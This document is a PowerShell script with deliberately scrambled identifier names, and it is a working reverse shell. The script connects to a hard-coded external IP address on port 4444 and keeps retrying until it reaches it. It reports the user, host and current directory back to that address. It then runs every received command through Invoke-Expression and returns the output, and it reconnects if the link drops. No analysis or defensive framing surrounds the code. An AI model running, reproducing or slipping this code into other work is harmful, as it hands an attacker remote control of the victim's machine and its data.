class CTuNuPJFlz {
    
    [string]$DdfHqaarOWBhXywmpRqQLZd = "93.49.240.195"
    [int]$dOpNtYtfXWrwfqnHuAyytg = 4444

    $hrPmNpyxtqjfaExI
    $ooyhqrUBnhBuDpOeKhO
    $YTqMYzzTlXRoEHthZe
    $NahstxmohvvTt
    $iklwwhwzvZhWUuQntS
    $TdwYcxiWfaTYqiuuw
    [int]$XSAyGuKoaCIj = 50*1024

    KxNDHczyTTNFS() {
        $this.ooyhqrUBnhBuDpOeKhO = $false
        while ($true) {
            try {
                $this.ooyhqrUBnhBuDpOeKhO = New-Object Net.Sockets.TcpClient($this.DdfHqaarOWBhXywmpRqQLZd, $this.dOpNtYtfXWrwfqnHuAyytg)
                break
            } catch [System.Net.Sockets.SocketException] {
                Start-Sleep -Seconds 5
            }
        }
        $this.BVylyElrr()
    }

    BVylyElrr() {
        $this.hrPmNpyxtqjfaExI = $this.ooyhqrUBnhBuDpOeKhO.GetStream()
        $this.NahstxmohvvTt = New-Object Byte[] $this.XSAyGuKoaCIj
        $this.TdwYcxiWfaTYqiuuw = New-Object Text.UTF8Encoding
        $this.YTqMYzzTlXRoEHthZe = New-Object IO.StreamWriter($this.hrPmNpyxtqjfaExI, [Text.Encoding]::UTF8, $this.XSAyGuKoaCIj)
        $this.iklwwhwzvZhWUuQntS = New-Object System.IO.StreamReader($this.hrPmNpyxtqjfaExI)
        $this.YTqMYzzTlXRoEHthZe.AutoFlush = $true
    }

    QHbllTnedsmaXdr() {
        $this.KxNDHczyTTNFS()
        $this.iwArVMQWfBCWKVmOc()
    }

    ttuvjwLwgYEE($AsMlOcGxrsMtpHfatMPNoG) {
        try {
            [byte[]]$ScWnGBhZQJUcHQiAxJAtaU = [text.Encoding]::Ascii.GetBytes($AsMlOcGxrsMtpHfatMPNoG)
            $this.YTqMYzzTlXRoEHthZe.Write($ScWnGBhZQJUcHQiAxJAtaU, 0, $ScWnGBhZQJUcHQiAxJAtaU.length)   
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.QHbllTnedsmaXdr()
        }
    }

    [string] sUIySzfz() {
        try {
            $AfSKpdQlePTGjqRsUGuziwR = $this.hrPmNpyxtqjfaExI.Read($this.NahstxmohvvTt, 0, $this.XSAyGuKoaCIj)    
            $RFRgKoczXvljxcXJGtTIudX = ($this.TdwYcxiWfaTYqiuuw.GetString($this.NahstxmohvvTt, 0, $AfSKpdQlePTGjqRsUGuziwR))
            return $RFRgKoczXvljxcXJGtTIudX
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.QHbllTnedsmaXdr()
            return ""
        }
    }

    [string] mndmh($gsayjZxERxfwz) {
        Write-Host $gsayjZxERxfwz
        try { 
            $rMCEHxmdLRPjlzqnrw = Invoke-Expression $gsayjZxERxfwz | Out-String
        }
        catch {
            $cBkjk = $_.Exception
            $ZLauuPfdyXTVeJKRxwyVh = $_.Message
            $rMCEHxmdLRPjlzqnrw = "`n$_`n"
        }
        return $rMCEHxmdLRPjlzqnrw
    }

    [string] wRrnllVeTKJT() {
        $LUWPSnuggbvWrK = [Environment]::UserName
        $tYnQFZGdWjeW = [System.Net.Dns]::GetHostName()
        $xbSkC = Get-Location
        return "$LUWPSnuggbvWrK@$tYnQFZGdWjeW [$xbSkC]~$ "
    }

    iwArVMQWfBCWKVmOc() {
        while ($this.ooyhqrUBnhBuDpOeKhO.Connected) {
            $this.ttuvjwLwgYEE($this.wRrnllVeTKJT())         
            $RFRgKoczXvljxcXJGtTIudX = $this.sUIySzfz()
            $rMCEHxmdLRPjlzqnrw = "`n"
            if ([string]::IsNullOrEmpty($RFRgKoczXvljxcXJGtTIudX)) {
                continue
            }
            $rMCEHxmdLRPjlzqnrw = $this.mndmh($RFRgKoczXvljxcXJGtTIudX)
            $this.ttuvjwLwgYEE($rMCEHxmdLRPjlzqnrw + "`n")
            $this.hrPmNpyxtqjfaExI.Flush()
        }
        $this.ooyhqrUBnhBuDpOeKhO.Close()
        $this.QHbllTnedsmaXdr()
    } 
}

$NZGCUcA = [CTuNuPJFlz]::new()
$NZGCUcA.QHbllTnedsmaXdr()
